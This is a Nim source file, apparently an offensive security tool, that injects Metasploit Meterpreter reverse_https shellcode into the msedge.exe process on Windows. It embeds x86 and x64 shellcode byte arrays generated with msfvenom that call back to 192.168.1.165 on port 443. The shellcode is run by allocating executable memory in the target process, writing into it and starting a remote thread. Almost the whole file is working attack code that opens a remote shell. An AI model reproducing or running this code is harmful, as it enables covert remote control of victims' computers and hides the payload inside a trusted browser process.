
import winim

when defined(windows):
    echo("Hello windows, having fun?")

    when defined(i386):
        echo("Hello i386")
        echo("You're about to have fun")

        # msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.165 LPORT=443 EXITFUNC=thread -f csharp
        let shellcode: array[668, byte] = [
            byte 0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,
            0x8b,0x52,0x0c,0x8b,0x52,0x14,0x31,0xff,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,
            0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0x49,
            0x75,0xef,0x52,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,
            0xc0,0x57,0x74,0x4c,0x01,0xd0,0x8b,0x58,0x20,0x01,0xd3,0x50,0x8b,0x48,0x18,
            0x85,0xc9,0x74,0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xac,
            0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,
            0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,
            0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,
            0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,
            0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,
            0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0xe8,0x78,0x00,0x00,0x00,
            0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x4d,0x61,
            0x63,0x69,0x6e,0x74,0x6f,0x73,0x68,0x3b,0x20,0x49,0x6e,0x74,0x65,0x6c,0x20,
            0x4d,0x61,0x63,0x20,0x4f,0x53,0x20,0x58,0x20,0x31,0x32,0x5f,0x32,0x5f,0x31,
            0x29,0x20,0x41,0x70,0x70,0x6c,0x65,0x57,0x65,0x62,0x4b,0x69,0x74,0x2f,0x35,
            0x33,0x37,0x2e,0x33,0x36,0x20,0x28,0x4b,0x48,0x54,0x4d,0x4c,0x2c,0x20,0x6c,
            0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,0x6f,0x29,0x20,0x43,0x68,0x72,0x6f,
            0x6d,0x65,0x2f,0x39,0x38,0x2e,0x30,0x2e,0x34,0x37,0x35,0x38,0x2e,0x38,0x31,
            0x20,0x53,0x61,0x66,0x61,0x72,0x69,0x2f,0x35,0x33,0x37,0x2e,0x33,0x36,0x00,
            0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0xbb,
            0x01,0x00,0x00,0xe8,0x26,0x01,0x00,0x00,0x2f,0x56,0x53,0x45,0x61,0x4f,0x6d,
            0x2d,0x39,0x39,0x52,0x4b,0x5f,0x75,0x62,0x36,0x34,0x33,0x59,0x72,0x36,0x57,
            0x67,0x35,0x75,0x59,0x49,0x46,0x66,0x31,0x50,0x51,0x64,0x32,0x6f,0x69,0x66,
            0x69,0x45,0x57,0x57,0x64,0x45,0x6e,0x63,0x72,0x44,0x65,0x59,0x70,0x6e,0x54,
            0x55,0x37,0x47,0x6b,0x74,0x6e,0x34,0x5a,0x61,0x6f,0x4c,0x6a,0x52,0x75,0x35,
            0x54,0x32,0x6d,0x4f,0x6d,0x49,0x6f,0x69,0x73,0x55,0x59,0x55,0x68,0x6f,0x63,
            0x6c,0x4b,0x78,0x32,0x59,0x58,0x35,0x62,0x45,0x4f,0x5f,0x6f,0x58,0x76,0x37,
            0x4e,0x7a,0x54,0x6f,0x78,0x6c,0x79,0x63,0x42,0x53,0x43,0x30,0x46,0x2d,0x4b,
            0x74,0x5a,0x35,0x41,0x66,0x62,0x41,0x6f,0x67,0x6b,0x43,0x34,0x2d,0x36,0x2d,
            0x51,0x43,0x52,0x56,0x48,0x7a,0x6e,0x5a,0x6f,0x76,0x62,0x6d,0x34,0x52,0x44,
            0x67,0x65,0x6c,0x59,0x34,0x37,0x58,0x6b,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,
            0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe8,0x84,0x53,0x53,0x53,0x57,0x53,
            0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,
            0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,
            0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,
            0xc0,0x75,0x14,0x68,0x88,0x13,0x00,0x00,0x68,0x44,0xf0,0x35,0xe0,0xff,0xd5,
            0x4f,0x75,0xcd,0xe8,0x4a,0x00,0x00,0x00,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,
            0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,
            0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,
            0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,
            0x58,0xc3,0x5f,0xe8,0x6b,0xff,0xff,0xff,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,
            0x2e,0x31,0x2e,0x31,0x36,0x35,0x00,0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,
            0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,
            0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5]

    when defined(amd64):
        echo("Hello amd64")
        echo("You're about to have fun")

        # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.165 LPORT=443 EXITFUNC=thread -f csharp
        let shellcode: array[585, byte] = [
                    byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                    0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x51,0x48,0x8b,0x52,0x18,0x56,0x48,
                    0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
                    0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                    0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,
                    0x66,0x81,0x78,0x18,0x0b,0x02,0x41,0x51,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
                    0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,
                    0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x4d,
                    0x31,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,
                    0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
                    0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
                    0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,
                    0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
                    0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
                    0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,
                    0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,
                    0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,
                    0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
                    0xe8,0x0e,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x31,0x2e,
                    0x31,0x36,0x35,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x01,0x00,0x00,
                    0x4d,0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,
                    0x00,0x00,0x00,0xff,0xd5,0xe8,0x1f,0x00,0x00,0x00,0x2f,0x51,0x35,0x65,0x75,
                    0x66,0x54,0x50,0x72,0x7a,0x42,0x36,0x4d,0x43,0x34,0x30,0x4a,0x37,0x6a,0x6a,
                    0x4b,0x63,0x77,0x2d,0x70,0x45,0x32,0x6e,0x58,0x46,0x00,0x48,0x89,0xc1,0x53,
                    0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x00,0x32,0xa8,0x84,0x00,0x00,
                    0x00,0x00,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,
                    0x89,0xc6,0x6a,0x0a,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,
                    0x00,0x00,0x49,0x89,0xe0,0x6a,0x04,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,
                    0x00,0x00,0x00,0x00,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,
                    0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x06,0x18,0x7b,0xff,
                    0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x00,0x00,0x49,0xba,0x44,
                    0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0xff,0xcf,0x74,0x02,0xeb,
                    0xaa,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,
                    0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,0x00,0x00,0x49,0xba,0x58,0xa4,0x53,0xe5,
                    0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,
                    0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,0x20,0x00,0x00,0x49,0x89,0xf9,0x49,
                    0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x83,0xc4,0x20,
                    0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,
                    0xc3,0x58,0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5]

    # thanks https://github.com/byt3bl33d3r/OffensiveNim/blob/52cab4dab6deb0ed2bba98fcff6f13d529163a90/src/taskbar_ewmi_bin.nim
    proc toString(chars: openArray[WCHAR]): string =
        result = ""
        for c in chars:
            if cast[char](c) == '\0':
                break
            result.add(cast[char](c))

    proc GetProcessByName(process_name: string): DWORD =
        var
            pid: DWORD = 0
            entry: PROCESSENTRY32
            hSnapshot: HANDLE

        entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
        hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        defer: CloseHandle(hSnapshot)

        if Process32First(hSnapshot, addr entry):
            while Process32Next(hSnapshot, addr entry):
                if entry.szExeFile.toString == process_name:
                    pid = entry.th32ProcessID
                    break
        return pid

    when isMainModule:
        let tProcess = GetProcessByName("msedge.exe")
        echo("Targeting process: ", tProcess)

        #get a handle on the target process
        let tHandle:HANDLE = OpenProcess(
            PROCESS_ALL_ACCESS,
            false,
            tProcess
        )

        #let's allocate memory
        let rPtr:LPVOID = VirtualAllocEx(
            tHandle,
            nil,
            cast[SIZE_T](shellcode.len),
            MEM_COMMIT,
            PAGE_EXECUTE_READ_WRITE
        )

        #copy our shellcode to the memory section allocated
        # thanks https://github.com/byt3bl33d3r/OffensiveNim/blob/965c44cec96575758eaa42622f699b6ea0d1041a/src/shellcode_bin.nim
        var bytesWritten: SIZE_T
        let rBool:BOOL = WriteProcessMemory(
            tHandle,
            rPtr,
            unsafeAddr shellcode,
            cast[SIZE_T](shellcode.len),
            addr bytesWritten
        )

        #and create a thread!
        let hThread:HANDLE = CreateRemoteThread(
            tHandle,
            nil,
            0,
            cast[LPTHREAD_START_ROUTINE](rPtr),
            nil,
            0,
            nil
        )